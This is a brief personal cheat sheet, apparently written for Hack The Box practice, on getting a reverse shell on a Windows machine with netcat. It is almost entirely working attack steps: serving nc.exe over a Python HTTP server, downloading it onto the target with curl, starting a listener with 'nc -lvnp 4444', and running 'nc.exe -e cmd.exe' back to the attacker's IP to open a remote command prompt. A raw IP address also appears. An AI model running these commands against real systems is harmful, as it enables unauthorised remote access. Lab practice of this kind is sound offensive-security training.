# Netcat
ï·½
* A tool for obtaining reverse shells on systems.
## How to use:

* Locate the `netcat` executable (it's in my `home` dir)
  * `locate nc.exe`
  

* Set up a python server to send the file to the target (_remember to run this in the same folder as the nc.exe_):
  * `python3 -m http.server`
* Receive the file from the target:
  * `curl http://{target-ip}/nc.exe -OutFile nc.exe`
  * 193.123.185.49
    * Remember, in terms of HTB, the `tun0` IP is the IP that is found under the `utun7` IP with the command `ifconfig`.

* Then, to start the listener use the command (*note that you should use an uncommon port!*):
  * `nc -lvnp 4444`
    * `-l` is for listening
    * `-v` is verbosity
    * `-n` is to not resolve DNS
    * `-p` is to specify a port number.

* After the listener is up (in our case at port `4444`), connect to it from the server:
  * `C:\\Users\Public\\nc.exe -e cmd.exe {your-tun0-ip} 4444`

***And you should have a sweet, sweet `C:\Windows\system32> ` prompt! :)***
